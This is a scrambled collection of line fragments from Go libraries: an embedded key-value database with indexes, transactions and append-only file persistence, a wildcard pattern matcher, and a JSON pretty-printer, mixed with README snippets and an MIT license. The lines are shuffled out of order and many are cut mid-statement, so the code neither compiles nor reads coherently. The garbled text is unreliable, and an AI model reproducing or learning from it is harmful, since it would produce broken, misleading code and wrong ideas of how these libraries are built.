return ErrNotFound
"iterator func(key, value string, dist float64) bool) error {"
rbidxs map[string]
if err != nil {
"// When an index is provided, the results will be ordered by the item values"
// expiresAt will return the time when the item will expire. When an item does
rollbackIndexes map[string]
err = tx.Rollback()
prc := float64(db.config.AutoShrinkPercentage) / 100.0
"// [last, first], until iterator returns false."
// an automatic shrink can occur.
sopts = 
 int(line[i]-'0')
"return db.readLoad(rd, time.Now())"
 len(parts) == 4 
return ErrInvalid
if len(ignoreExpired) != 0 {
DB) load() error {
"// An error is returned when a write error occurs, or when a Commit() is called"
"tx.db.buf = append(tx.db.buf, """
"db.keys, db.exps, db.idxs, db.file = nil, nil, nil, nil"
// get return an item or nil if not found.
(parts[0][2] == 'l' 
"return previousValue, replaced, nil"
"ib, _ := strconv.ParseFloat(b, 64)"
AutoShrinkPercentage int
if tx.db.config.SyncPolicy == Always {
if tr == nil {
"pos, err := db.file.Seek(0, 1)"
if tx.wc.rbkeys != nil {
for i := 1
' matches on
// The rect function converts a string to a rectangle. The rectangle is
// one final flush
if tx.db.persist 
dbItem {
// SyncPolicy adjusts how often the data is synced to disk.
// The transaction has been committed when no error is returned.
"return nil, ErrNotFound"
// the current read/write transaction is completed.
 i < len(b)
// has been expired.
tx.db.flushes
"ErrTxNotWritable = errors.New(""tx not writable"")"
// DescendRange calls the iterator for every item in the database within
// function bound to the index
"// pivot, until iterator returns false."
"// For example, if this value is 100, and the last shrink process"
// ErrTxNotWritable is returned when performing a write operation on a
// in a panic.
// Returns ErrNotFound if the index is not found or there is no rect
// AscendGreaterOrEqual calls the iterator for every item in the database within
dbItem) writeDeleteTo(buf []byte) []byte {
persist   bool              // do we write to disk
funcd    bool            // when true Commit and Rollback panic.
"buf = appendBulkString(buf, strconv.FormatUint(uint64(ex), 10))"
pdbi = prev.(
"// it's ok to get a ""not found"" because the"
"SyncPolicy:           EverySecond,"
"buf = appendBulkString(buf, ""set"")"
 !ok {
// The desc param indicates that the iterator should descend.
DB) ReadConfig(config 
// formula to use on an item. Each b-tree should use a different ctx when
n' {
db       
return dbi.opts != nil 
"return iterator(key, value)"
"pattern: idx.pattern,"
db.insertIntoDatabase(
// The gt param indicates that there is a greaterThan limit.
if db.closed {
tx.wc.itercount
// read-only transaction can only roll back.
return tx.scan(
"if _, ok := tx.db.idxs[name]"
if dbi.opts == nil 
now := time.Now()
if err == io.EOF {
"db.file, err = os.OpenFile(path, os.O_CREATE"
AutoShrinkDisabled bool
// use a buffered writer and flush every 4MB
index) match(key string) bool {
"if match.Match(key, pattern) {"
return err
if len(parts) < 3 
// exctx is a simple b-tree context for ordering by expiration.
dbi := item.(
// Always fall back to the key comparison. This creates absolute uniqueness.
"return """", ErrTxNotWritable"
"for name, idx := range tx.wc.rollbackIndexes {"
"less = func(a, b string) bool {"
return tx.DropIndex(name)
if b[i] >= 'A' 
if ctx.less != nil {
dbItem
dbItem{key: key}).writeDeleteTo(tx.db.buf)
"// the range [pivot, first], until iterator returns false."
if err = db.Shrink()
"// between 1 and 20, and both arrays must match in length. A length of 1 is a"
if len(parts) == 5 {
// Set inserts or replaces an item in the database based on the key.
btree.BTree                           // contains the items
"buf = appendBulkString(buf, dbi.key)"
"if idx.pattern == """
if key < min {
r := bufio.NewReader(rd)
if err == ErrIndexExists {
// index with name already exists. error.
} else if a[i] > b[i] {
// Using an index
// The values of min must be less than the values of max at the same dimension.
// ReplaceIndex builds a new index and populates it with items.
} else if onExpiredSync != nil {
"buf = append(buf, strconv.FormatInt(int64(count), 10)...)"
return pdbi
// problem in the future if we choose to use syscall file locking.
"ErrNotFound = errors.New(""not found"")"
"case Never, EverySecond, Always:"
return a < b
btree.BTree      // a tree of all item ordered by key
"replaced bool, err error) {"
// database thus allowing for access to anything we need.
// to the tmp file and finally swap the files out.
// read each part of the command.
func (tx 
DB) Begin(writable bool) (
func(item btree.Item) bool {
for name := range tx.db.idxs {
_ = db.file.Close()
"// When a non-nil error is returned from the function, the transaction will be"
"// If a previous index with the same name exists, that index will be deleted."
return ErrDatabaseClosed
// An invalid rectangle will cause a panic.
"panic(""managed tx rollback not allowed"")"
 Descend
// A previous item was removed from the keys tree. Let's
// rollback when deleteAll is called
"return dur, nil"
// not change the seek position of the previous. This may cause a
func (idx 
 i < len(a) 
tx.funcd = true
"return tx.createIndex(name, pattern, less, nil, opts)"
AutoShrinkMinSize int
if !ok 
// Open a standard view. This will take a full lock of the
"return names, err"
prev := db.keys.Delete(item)
DB                                    // the origin database
const btreeDegrees = 64
"func IndexBinary(a, b string) bool {"
DB) backgroundManager() {
var sopts IndexOptions
 line[1] > '9' {
"var errValidEOF = errors.New(""valid eof"")"
"// writes, but not reads. This can be used for snapshots and backups for pure"
"return tx.db.keys.Len(), nil"
type index struct {
idx.btr.ReplaceOrInsert(item)
// now reset the live database trees
btree.BTree
"if _, err = tx.db.file.Write(tx.db.buf)"
"for _, idx := range db.idxs {"
dur := item.opts.exat.Sub(time.Now())
index) rebuild() {
"expired = append(expired, item.("
"func IndexString(a, b string) bool {"
// read a single command.
"key: parts[1],"
if err := f.Close()
func (dbi 
import (
if pattern[0] == '
// the item does not have 
if dur < 0 {
// unlock unlocks the database based on the transaction type.
closed    bool              // set when the database has been closed
done = true
// Save writes a snapshot of the database to a writer. This operation blocks all
// for additional options.
for i := 0
Tx) error) (err error) {
"ia, _ := strconv.ParseUint(a, 10, 64)"
// finally re-create the indexes
// function for each item encountered.
if onExpired == nil 
// If this operation fails then the write did failed and we must
"var itemA, itemB "
"DB, error) {"
(parts[0][1] == 'e' 
"// a is uppercase, convert a to lowercase"
// AscendKeys allows for iterating through keys based on the specified pattern.
if (parts[0][0] == 's' 
// initialize default configuration
prev := tx.db.insertIntoDatabase(item)
if idx.btr != nil {
 i < len(key)
// finished writing all of the current items.
if line[i] < '0' 
"dbItemOpts{ex: true, exat: time.Now().Add(opts.TTL)}"
// ErrNotFound is returned when an item or index is not in the database.
(parts[0][2] == 't' 
"Tx) Len() (int, error) {"
// The items are ordered in an b-tree and can be retrieved using the
// cannot load into databases that persist to disk
rollbackItems   map[string]
// map to see if there isn't already an item that matches the
// Shrink will make the database file smaller by removing redundant
"ErrDatabaseClosed = errors.New(""database closed"")"
"// not opened with Open("":memory:"")."
// copy the index meta information
"Tx) Get(key string, ignoreExpired ...bool) (val string, err error) {"
// Less determines if a b-tree item is less than another. This is required
default:
"""os"""
// Desc is a helper function that changes the order of an index.
"Tx, error) {"
prev := db.keys.ReplaceOrInsert(item)
"// Read-only transactions can only be rolled back, not committed."
defer func() { _ = aof.Close() }()
// produce a list of expired items that need removing
if item.opts != nil 
// The database is already in the process of shrinking.
if dbi.expiresAt().After(dbi2.expiresAt()) {
"Tx) DescendRange(index, lessOrEqual, greaterThan string,"
"// will be replaced with the new one, and return the previous item."
if line[0] != '
"buf = append(buf, '"
// b-tree/r-tree context for itself.
// Config represents database configuration options. These
index:
db.mu.Lock()
return maxTime
exctx{db})
 time.Now().After(dbi.opts.exat)
opts.ex
Always = 2
} else {
// transactions while another one is in progress will result in blocking until
break
if err := aof.Close()
dbItem) writeSetTo(buf []byte) []byte {
// Delete removes an item from the database based on the item's key. If the item
"if err := db.readLoad(db.file, fi.ModTime())"
if prev == nil {
// we use a non-nil copy of the index without the data to indicate that the
switch len(lessers) {
idx.btr.Delete(pdbi)
fname := db.file.Name()
if len(buf) > 0 {
"r', '"
if !prev.expired() {
// check to see if we've already deleted everything
"if _, ok := tx.wc.rollbackIndexes[name]"
dbItem)
// returned to the caller. A nil return value means that the item was not
name    string                                 // name of the index
"return iterator(dbi.key, dbi.val)"
defer func() {
// of RESP commands. For more information on RESP please read
if !db.persist {
pattern string                                 // a required key pattern
if len(parts) == 0 {
"if name == """" {"
"if ctx.less(dbi.val, dbi2.val) {"
"rect{min, max}, iter)"
// to note that the ctx parameter is used to help with determine which
"Tx) AscendGreaterOrEqual(index, pivot string,"
"""github.com/tidwall/btree"""
"if err := os.Rename(tmpname, fname)"
"data := make([]byte, 4096)"
 tx.wc.rbkeys != nil) {
go db.backgroundManager()
idx.rtr.Remove(pdbi)
if tx.funcd {
// View executes a function within a managed read-only transaction.
db.keys.Ascend(func(item btree.Item) bool {
writable bool            // when false mutable operations fail.
// The new item has eviction options. Add it to the
DB             // the underlying database.
"""io"""
"// represented by two arrays, min and max. Both arrays may have a length"
"func appendBulkString(buf []byte, s string) []byte {"
type Tx struct {
// Ascend
tx.wc.rbexps = tx.db.exps
// All transactions must be closed by calling Commit() or Rollback() when done.
// cannot create an index without a name.
tx.wc.rollbackIndexes[name] = nil
// save the index
return ErrShrinkInProcess
// AutoShrinkMinSize defines the minimum size of the aof file before
"dbItem{key: key}"" is all"
// ErrTxClosed is returned when committing or rolling back a transaction
tx.wc = 
// IndexUint is a helper function that returns true if 'a' is less than 'b'.
Config) error {
// The results of this operation will not be available to other
// that is needed to fully remove the item with the matching key. If an item
"DB) ReplaceSpatialIndex(name, pattern string,"
db.file.Sync() // do a sync but ignore the error
"return tx.scan(true, false, false, index, """", """", iterator)"
 parts[0][1] == 'E') 
"""strconv"""
"// in-memory databases using the "":memory:"". Database that persist to disk"
itemA = 
"// When an index is not provided, the results will be ordered by the item key."
"less    func(a, b string) bool                 // less comparison function"
iter := func(item rtree.Item) bool {
if onExpired == nil {
"rect) Rect(ctx interface{}) (min, max []float64) {"
"Tx) Ascend(index string,"
exctx:
// used for b-tree ordering.
"buf = append(buf, s...)"
) error {
if item != nil {
if a[i] < b[i]
config    Config            // the database configuration
tx.wc.rollbackIndexes[name] = idx.clearCopy()
if gt {
"true, true, true, index, lessOrEqual, greaterThan, iterator,"
rbkeys 
if len(line) == 4 
"if index != """" {"
// AscendRange calls the iterator for every item in the database within
// Commit writes all changes to disk.
if db.persist 
opts    IndexOptions                           // index options
"tr.AscendRange(itemA, itemB, iter)"
"return iterator(dbi.key, dbi.val, dist)"
db.shrinking = false
"rect:    idx.rect,"
idx := tx.db.idxs[index]
// AutoShrinkPercentage is used by the background process to trigger
if dbi.opts != nil 
"""github.com/tidwall/grect"""
// sharing the same item.
err := func() error {
"Tx) DescendKeys(pattern string,"
 a[i] <= 'Z' {
dbItem{key: parts[1]})
tx := 
// wrap a btree specific iterator around the user-defined iterator.
if sopts.CaseInsensitiveKeyMatching {
// There are some default less function that can be used such as
"return nil, nil"
type dbItem struct {
exctx{tx.db})
// It's pretty fast and you can lose 1 second of data if there
"DB) Indexes() ([]string, error) {"
TTL time.Duration
"keys = append(keys, itm.key)"
shrinking bool              // when an aof shrink is in-process.
// iterated through every item in the database and write to the buffer
 item.opts.ex {
// ErrDatabaseClosed is returned when the database is closed.
if n > 1000 
db.shrinking = true
"DB) CreateSpatialIndex(name, pattern string,"
// CreateIndexOptions is the same as CreateIndex except that it allows
// the caller is only interested in items that have not expired.
// copy string
// DescendGreaterThan calls the iterator for every item in the database within
"val: parts[2],"
DB) deleteFromDatabase(item 
"pivot := """""
"IndexOptions,"
// execute the search
"less ...func(a, b string) bool) error {"
"DB) CreateIndex(name, pattern string,"
if pdbi.opts != nil 
"""sort"""
// All transactions must be committed or rolled-back when done.
"buf = appendBulkString(buf, ""ex"")"
flushes := 0
// rollbackInner handles the underlying rollback logic.
db.config = Config{
// into the database overwriting the current one.
// http://redis.io/topics/protocol. The only supported RESP commands are DEL and
"// with the matching key was found in the database, it will be removed and"
tr.Ascend(iter)
"min, max := match.Allowable(pattern)"
if a[i] < b[i] {
if key[i] >= 'A' 
"// descending order, these will be lessThan, greaterThan."
opts     
opts
 parts[0][2] == 'T') {
} else if dbi2.keyless {
"if pattern == """" {"
// cannot search on keys tree. just return nil.
var ignore bool
// index represents a b-tree or r-tree index and also acts as the
"endpos, err := db.file.Seek(0, 2)"
if a[i] >= 'A' 
// SET.
mu        sync.RWMutex      // the gatekeeper for all fields
if !idx.match(dbi.key) {
"names, err = tx.Indexes()"
// Insert the item into the keys tree.
// This operation is not allowed during iterations such as Ascend
// Default number of btree degrees
// initialize trees and indexes
"key, val string      // the binary key and value"
// operations such as removing expired items and syncing to disk.
' matches on any number characters and '
return ErrInvalidSyncPolicy
 len(parts) > 5 {
if tx.writable {
// flush when buffer is over 4MB
// AscendLessThan calls the iterator for every item in the database within the
defer t.Stop()
// Intended to be called from Commit() and Rollback().
type Config struct {
// load reads entries from the append only database file and fills the database.
Tx) Rollback() error {
_ = f.Close()
"func IndexUint(a, b string) bool {"
// to a rectangle for a spatial index.
"Tx) CreateIndex(name, pattern string,"
// read-only transaction.
// An invalid index will return an error.
// Close releases all database resources.
// IndexFloat is a helper function that returns true if 'a' is less than 'b'.
 line[len(line)-2] != '
// simple pattern matcher where '
"line, err := r.ReadBytes('"
 dbi.opts.ex {
// DeleteAll deletes all items from the database.
"if _, err := aof.Seek(endpos, 0)"
tx.wc.rollbackItems = make(map[string]
"ErrPersistenceActive = errors.New(""persistence active"")"
// this could be an expensive process if the database has many
// The caller is requesting that this item expires. Convert the
"names = append(names, name)"
"Tx) Descend(index string,"
// OnExpired is used to custom handle the deletion option when a key
tr.Descend(iter)
"return idx.less, nil"
aofsz := int(pos)
"// send expired event, if needed"
// insert into the rollback map if there has not been a deleteAll.
dbItem{val: stop}
// Only a writable transaction can be used with this operation.
err = tx.Commit()
 len(expired) > 0 {
"return 0, ErrNotFound"
"// The file format uses the Redis append only file format, which is and a series"
"return -1, nil"
// write a flushdb if a deleteAll was called.
// case-sensitive strings.
dbItem) 
// This is a long time in the future. It's an imaginary number that is
commitItems     map[string]
"Tx) Indexes() ([]string, error) {"
"_, err = wr.Write(buf)"
// All items belonging to the specified index will be returned in order of
"if strings.ToLower(parts[3]) != ""ex"" {"
item := tx.db.deleteFromDatabase(
// Descend calls the iterator for every item in the database within the range
panic(err)
DB) Load(rd io.Reader) error {
// index was not found. return error
// rollback the deleteAll if needed
"rect func(item string) (min, max []float64),"
return nil
// items or the index is complex.
"ErrInvalidSyncPolicy = errors.New(""invalid sync policy"")"
"// resulted in a 100mb file, then the new aof file must be 200mb before"
_ = os.RemoveAll(tmpname)
// match matches the pattern to the key
if idx.rtr == nil {
// rect is used by Intersects and Nearby
"min, max []float64"
return dbi.opts.exat
" nil, that means the entry should be reverted."
dataln 
// transactions until the current transaction has successfully committed.
"return lessers[len(lessers)-1](a, b)"
case 1:
// create a rollback entry with a nil value. A nil value indicates
// multiple less functions specified.
if dbi.keyless {
if a[i]
n = int(line[1] - '0')
// AutoShrinkDisabled turns off automatic background shrinking
// Load loads commands from reader. This operation blocks all reads and writes.
// alternate functionality.
buf = dbi.writeSetTo(buf)
"db:      tx.db,"
if idx.opts.CaseInsensitiveKeyMatching {
// fully delete this item from all indexes.
if db.shrinking {
"return func(a, b string) bool {"
// Unlock the database and allow for another writable transaction.
"for key, item := range tx.wc.commitItems {"
index {
"Tx) DescendEqual(index, pivot string,"
"// When an item is not nil, we will need to reinsert that item"
var tx 
Tx) DeleteAll() error {
"return tx.Descend("""", iterator)"
if lt {
// execute the nearby search
// found in the database
nidx := 
1024
// CreateSpatialIndex builds a new index and populates it with items.
"return tx.DescendLessOrEqual("""", max, func(key, value string) bool {"
db.idxs = make(map[string]
// parameter.
// Transactions are used for all forms of data access to the DB.
return ErrTxClosed
// CreateIndex builds a new index and populates it with items.
// neither are uppercase
"buf = appendArray(buf, 2)"
// Returns ErrNotFound if the index is not found or there is no less
// DropIndex removes an index.
dbItem{key: key})
r := grect.Get(a)
type exctx struct {
// any one character.
func() {
// Rect is helper function that returns a string representation
"for name, idx := range tx.wc.rbidxs {"
// The caller returned an error. We must rollback.
// The index param tells the scanner to use the specified index tree. An
"""github.com/tidwall/rtree"""
"""github.com/tidwall/match"""
return ErrIndexExists
"func appendArray(buf []byte, count int) []byte {"
type SyncPolicy int
// 1000 items or 64MB buffer
_ = tx.Rollback()
var names []string
 data[n
// CaseInsensitiveKeyMatching allow for case-insensitive
// The items are organized in an r-tree and can be retrieved using the
// Rect() is the reverse function and can be used to generate a string
// writeSetTo writes an item as a single SET record to the a bufio Writer.
shrink = aofsz > db.lastaofsz
n = n
// nearest to farthest.
return
if idx.rect != nil {
// IndexOptions provides an index with additional features or
tx.wc.rollbackIndexes = make(map[string]
tx.db = nil
// DescendLessOrEqual calls the iterator for every item in the database within
// Update executes a function within a managed read/write transaction.
index)
"panic(""invalid rune encoding"")"
" deepMatchRune(str[srsz:], pattern))"
"minb = append(minb, 0)"
pattern = pattern[prsz:]
" deepMatch(str[1:], pattern))"
 len(pattern) == 0
c           matches character c (c != '
default:
// done reading
// term:
"return deepMatch(str, pattern)"
 pattern[0] == '
(srsz > 0 
"if utf8.EncodeRune(b, '"
if pattern[0] > 0x7f {
' matches on any one character.
"return deepMatch(str, pattern[1:]) "
if len(str) > 0 {
"maxb = append(maxb[:len(maxb)-n], b[:nn]...)"
return srsz == 0 
(len(str) > 0 
"minb = append(minb, pattern[i])"
package match
"sr, srsz = utf8.RuneError, 0"
if r > 0x7f {
"pr, prsz = utf8.DecodeRuneInString(pattern)"
switch pr {
// values that the pattern can represent.
"return deepMatchRune(str, pattern[prsz:]) "
U0010FFFF') != 4 {
pattern = pattern[1:]
if wild {
if sr != pr {
"minb := make([]byte, 0, len(pattern))"
if len(str) == 0 {
"sr, srsz = utf8.DecodeRuneInString(str)"
wild = true
 prsz == 0
"func Match(str, pattern string) bool {"
var maxRuneBytes = func() []byte {
// and '
"// When the max cannot be determined, 'true' will be returned"
// for infinite.
if str[0] != pattern[0] {
' c      matches character c
if r < utf8.MaxRune {
} else {
str = str[srsz:]
"if pattern == """
if srsz == utf8.RuneError {
"if pattern == """" "
if str[i] == '
"import ""unicode/utf8"""
break
return true
"pr, prsz = rune(pattern[0]), 1"
'         matches any sequence of non-Separator characters
// Match provides a simple pattern matcher with unicode support.
"r, n := utf8.DecodeLastRune(maxb)"
for pr != utf8.RuneError {
' matches on any number characters
"func deepMatchRune(str, pattern string) bool {"
"maxb = append(maxb, maxRuneBytes...)"
// Match returns true if str matches pattern. This is a very
"maxb = append(maxb[:len(maxb)-n], byte(r))"
"pr, prsz = utf8.RuneError, 0"
"func deepMatch(str, pattern string) bool {"
str = str[1:]
// read the first rune ahead of time
// simple wildcard match where '
for i := 0
 str[i] == '
// pattern:
"return string(minb), string(maxb)"
var wild bool
return len(str) == 0 
case '
// Allowable parses the pattern and determines the minimum and maximum allowable
"', '"
'         matches any single non-Separator character
if pattern[i] == '
if len(pattern) > 0 {
func IsPattern(str string) bool {
// read the next runes
{ term }
if r != utf8.RuneError {
// IsPattern returns true if the string is a pattern.
if str[0] > 0x7f {
return b
switch pattern[0] {
"nn := utf8.EncodeRune(b, r)"
"sr, srsz = rune(str[0]), 1"
"var sr, pr rune"
"func Allowable(pattern string) (min, max string) {"
return false
 i < len(pattern)
for len(pattern) > 0 {
"return """", """""
"return deepMatchRune(str, pattern)"
 i < len(str)
"maxb = append(maxb, pattern[i])"
"b := make([]byte, 4)"
"var srsz, prsz int"
"maxb := make([]byte, 0, len(pattern))"
=====
"style=flat-square"" alt=""Build Status""></a>"
"<a href=""https://godoc.org/github.com/tidwall/match""><img src=""https://img.shields.io/badge/api-reference-blue.svg"
Contact
go get -u github.com/tidwall/match
"match.Match(""hello"", """
Match is a very simple pattern matcher where '
-------
License
Example
"match.Match(""jello"", """
' matches on any 
"style=flat-square"" alt=""GoDoc""></a>"
"o"") "
Installing
"llo"") "
number characters and '
' matches on any one character.
Redcon source code is available under the MIT [License](/LICENSE).
"ello"") "
Match
"<a href=""https://travis-ci.org/tidwall/match""><img src=""https://img.shields.io/travis/tidwall/match.svg"
Josh Baker [@tidwall](http://twitter.com/tidwall)
"match.Match(""hello"", ""h"
----------
copies or substantial portions of the Software.
"this software and associated documentation files (the ""Software""), to deal in"
"the Software, and to permit persons to whom the Software is furnished to do so,"
Copyright (c) 2016 Josh Baker
"Permission is hereby granted, free of charge, to any person obtaining a copy of"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS"
"use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of"
"COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER"
The MIT License (MIT)
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
"IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN"
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"the Software without restriction, including without limitation the rights to"
language: go
if len(indent) == 2 
if open == '{' {
 '0'
"return buf, i "
// UglyInPlace removes insignificant space characters from the input json
if max > 3 {
"dst = append(dst, style.True[1]...)"
if src[i] > ' ' {
for 
return len(arr.pairs)
default:
"dst = append(dst, """
"True, False, Null   [2]string"
"Number: [2]string{"""
"return ugly(buf, json)"
nl = len(buf)
"func Pretty(json []byte) []byte { return PrettyOptions(json, nil) }"
"False:  [2]string{"""
"buf = append(buf, ',')"
"buf, i, nl, _ = appendPrettyString(buf, json, i, nl)"
"buf = append(buf, '"
"buf = append(buf, close)"
" 5, nl, true"
// TerminalStyle is for terminals
v') {
 src[i] == ']' 
// SortKeys will sort the keys alphabetically
if key {
 json[i] == ']' 
"apnd = func(dst []byte, c byte) []byte {"
"nbuf := make([]byte, 0, vend-vstart)"
"if src[i] == '""' {"
if ok 
p.kstart = i
switch json[i] {
} else {
 p.vstart > p.vend {
"vstart, vend int"
if json[i] <= ' ' 
break
if len(opts.Prefix) != 0 {
if buf[len(buf)-1] != open {
 indent[1] == ' ' {
var n int
 len(stack) > 0 
if len(prefix) != 0 {
if len(buf) > 0 {
"dst = append(dst, style.Null[0]...)"
// DefaultOptions is the default options for pretty formats.
case 't':
if src[j] != '
return (p - 10) 
kind byte
vend := pairs[len(pairs)-1].vend
"nbuf = append(nbuf, ',')"
"return buf, i, nl, true"
// Prefix is a prefix for all lines
case 'n':
if i < len(pairs)-1 {
// Options is Pretty options
// slice upon return.
"byKey) Less(i, j int) bool {"
if sortkeys {
 i < tabs
if json[j] == '
if pretty 
"buf := make([]byte, 0, len(json))"
"for i, p := range pairs {"
key1 := arr.json[arr.pairs[i].kstart
if width != -1 
" 1, nl, open != '{'"
"dst = append(dst, style.Null[1]...)"
return dst
 j-- {
 src[i] == ':' 
"Append              func(dst []byte, c byte) []byte"
func Ugly(json []byte) []byte {
if (src[i] >= '0' 
// input json buffer to avoid allocations. Do not use the original bytes
"x1B[92m"", """
"buf, i, _, ok = appendPrettyObject(buf, json, i, '[', ']', false, width, prefix, """", sortkeys, 0, 0, max)"
 j > s
"stack = append(stack, stackt{src[i], src[i] == '{'})"
if json[i] == close {
 src[i] == '}' {
dst = dst[:0]
if json[i] <= ' ' {
"buf = appendTabs(buf, prefix, indent, tabs)"
"buf = append(buf, opts.Prefix...)"
case 'f':
"func PrettyOptions(json []byte, opts "
// here we try to create a single line array
var TerminalStyle = 
if style == nil {
"Options{Width: 80, Prefix: """", Indent: ""  "", SortKeys: false}"
apnd := style.Append
"func Color(src []byte, style "
} else if kind == 'n' {
"Key, String, Number [2]string"
 json[i] == ':' 
if len(pairs) == 0 {
"dst = apnd(dst, '""')"
Prefix string
 i < len(json)
"buf = append(buf, open)"
p.kend = i
"Null:   [2]string{"""
 stack[len(stack)-1].key
var DefaultOptions = 
"arr := byKey{false, json, pairs}"
 src[i] == '-' {
 open == '{' {
 len(stack) > 0 {
"func appendPrettyAny(buf, json []byte, i int, pretty bool, width int, prefix, indent string, sortkeys bool, tabs, nl, max int) ([]byte, int, int, bool) {"
"func sortPairs(json, buf []byte, pairs []pair) []byte {"
"buf = append(buf, ' ')"
Style) []byte {
"return append(dst, hexp((c)"
key2 := arr.json[arr.pairs[j].kstart
if !arr.sorted {
// Color will colorize the json. The style parma is used for customizing
stack = stack[:len(stack)-1]
if (j-i)%2 != 0 {
// Default is two spaces
type byKey struct {
"dst = append(dst, style.Key[0]...)"
pairs  []pair
"func appendPrettyObject(buf, json []byte, i int, open, close byte, pretty bool, width int, prefix, indent string, sortkeys bool, tabs, nl, max int) ([]byte, int, int, bool) {"
"arr.pairs[i], arr.pairs[j] = arr.pairs[j], arr.pairs[i]"
"dst = append(dst, style.True[0]...)"
 i < len(src)
// Default is an empty string
" src[i] == ',' "
// TerminalStyle.
sortkeys = false
"dst = apnd(dst, src[i])"
"dst = append(dst, style.Number[1]...)"
// Ugly removes insignificant space characters from the input json byte slice
for i = i 
"x1B[93m"", """
json   []byte
// Pretty converts the input json into a more human readable format where each
"buf = appendTabs(buf, prefix, indent, tabs"
" src[i] == ',') "
"buf, i, nl, ok = appendPrettyAny(buf, json, i, pretty, width, prefix, indent, sortkeys, tabs"
 json[i] == '}' {
} else if kind == 't' {
"x1B[94m"", """
 'a'
} else if src[i] == '{' 
"opts.Width, opts.Prefix, opts.Indent, opts.SortKeys,"
"return buf, i, nl, false"
"dst = append(dst, hexp((c>>4)"
"return buf, i, nl, open != '{'"
"""sort"""
} else if (src[i] == '}' 
buf = buf[:s1]
return string(key1) < string(key2)
"0, 0, -1)"
"pairs = append(pairs, p)"
kind = 't'
} else if (src[i] == ':' 
"dst = append(dst, style.String[0]...)"
"func UglyInPlace(json []byte) []byte { return ugly(json, json) }"
"Key:    [2]string{"""
case p < 10:
s := i
 !ok {
"kstart, kend int"
"buf = append(buf, ' ', ' ')"
} else if src[i] == 'n' {
"dst = append(dst, style.Number[0]...)"
1 : arr.pairs[j].kend-1]
sorted bool
// and returns the compacted result.
"Append: func(dst []byte, c byte) []byte {"
type Options struct {
"nbuf = append(nbuf, buf[p.vstart:p.vend]...)"
 indent[0] == ' ' 
 c != '
"u00""...)"
" 4, nl, true"
 open == '[' 
var sc int
i = s2
 json[i] == '-' {
"return appendPrettyString(buf, json, i, nl)"
arr.sorted = true
"buf = sortPairs(json, buf, pairs)"
"dst = append(dst, style.False[0]...)"
// Width is an max column width for single line arrays
"return append(buf, 'n', 'u', 'l', 'l'), i "
type pair struct {
"s1, s2 := len(buf), i"
 src[i] == ']') 
if open == '[' 
p.vstart = len(buf)
"return append(buf, json[s:i]...), i, nl, true"
Indent string
if kind == '0' {
vstart := pairs[0].vstart
j := i - 1
 sortkeys {
 json[i] <= '9') 
if kind != 0 {
"buf = append(buf, ':')"
"x1B[91m"", """
"byKey) Swap(i, j int) {"
var p pair
"return append(dst, c)"
max := width - (len(buf) - nl)
if open == '{' 
p.vend = len(buf)
if json[i] == '[' {
// the colors. Passing nil to the style param will use the default
package pretty
var pairs []pair
"func appendPrettyString(buf, json []byte, i, nl int) ([]byte, int, int, bool) {"
arr)
 open == '[' {
"return append(buf, 'f', 'a', 'l', 's', 'e'), i "
" json[i] == ',' "
"buf = append(buf, indent...)"
switch {
"pairs = make([]pair, 0, 8)"
"buf = append(buf, prefix...)"
opts = DefaultOptions
var ok bool
"return appendPrettyObject(buf, json, i, '{', '}', pretty, width, prefix, indent, sortkeys, tabs, nl, max)"
"return append(buf[:vstart], nbuf...)"
 max == -1 {
"buf, _, _, _ = appendPrettyAny(buf, json, 0, true,"
"if json[i] == '""' {"
 len(buf)-s1 <= max {
// byte slice and returns the compacted result. This method reuses the
"x1B[0m""},"
"func appendTabs(buf []byte, prefix, indent string, tabs int) []byte {"
} else if kind == 'f' {
// Indent is the nested indentation
SortKeys bool
// PrettyOptions is like Pretty but with customized options.
sort.Sort(
if json[i] == '{' {
key  bool
// bad data. disable sorting
func hexp(p byte) byte {
byKey) Len() int {
" json[i] == '""' {"
if src[i] <= ' ' 
"String: [2]string{"""
Width int
if c < ' ' 
if width > 0 {
return p 
if pretty {
// Default is false
if p.kstart > p.kend 
kind = 'f'
kind = '0'
} else if src[i] == 'f' {
style = TerminalStyle
// Style is the color style
continue
"True:   [2]string{"""
Style{
1 : arr.pairs[i].kend-1]
"dst = append(dst, style.False[1]...)"
} else if max != -1 
var dst []byte
"return appendPrettyObject(buf, json, i, '[', ']', pretty, width, prefix, indent, sortkeys, tabs, nl, max)"
} else if src[i] == 't' {
"dst = append(dst, style.Key[1]...)"
// Default is 80
if (json[i] >= '0' 
 (c != '
if max != -1 
"return append(buf, 't', 'r', 'u', 'e'), i "
import (
"return appendPrettyNumber(buf, json, i, nl)"
type Style struct {
type stackt struct {
for j := i - 1
 open == '{' 
kind = 'n'
0xF))
for i := 0
if opts == nil {
"dst = append(dst, src[i])"
var stack []stackt
 src[i] == '[' {
"func appendPrettyNumber(buf, json []byte, i, nl int) ([]byte, int, int, bool) {"
if n > 0 {
"x1B[96m"", """
Options) []byte {
// element is on it's own line with clear indentation.
key := len(stack) > 0 
"dst = append(dst, style.String[1]...)"
if apnd == nil {
"func ugly(dst, src []byte) []byte {"
"1, nl, max)"
func (arr 
 src[i] <= '9') 
if sc%2 == 1 {
"nbuf = append(nbuf, '"
var kind byte
stack[len(stack)-1].key = !stack[len(stack)-1].key
 stack[len(stack)-1].kind == '{' {
return buf
BenchmarkJSONCompact-8       1000000     2469 ns/op      758 B/op      4 allocs/op
 Performance
// Indent is the nested indentation
SortKeys bool
 function which allows for customizing the output with the following options:
 Pretty
"      ""first"": ""Janet"","
"""children"": [""Sara"",""Alex"",""Jack""],"
"    ""last"": ""Anderson"""
encoding/json
"      ""last"": ""Murphy"","
Width int
BenchmarkUgly-8              3000000      426 ns/op      240 B/op      1 allocs/op
Prefix string
 Contact
[![Build Status](https://img.shields.io/travis/tidwall/pretty.svg
 Customized output
// Default is false
  ]}
type Options struct {
Benchmarks of Pretty alongside the builtin 
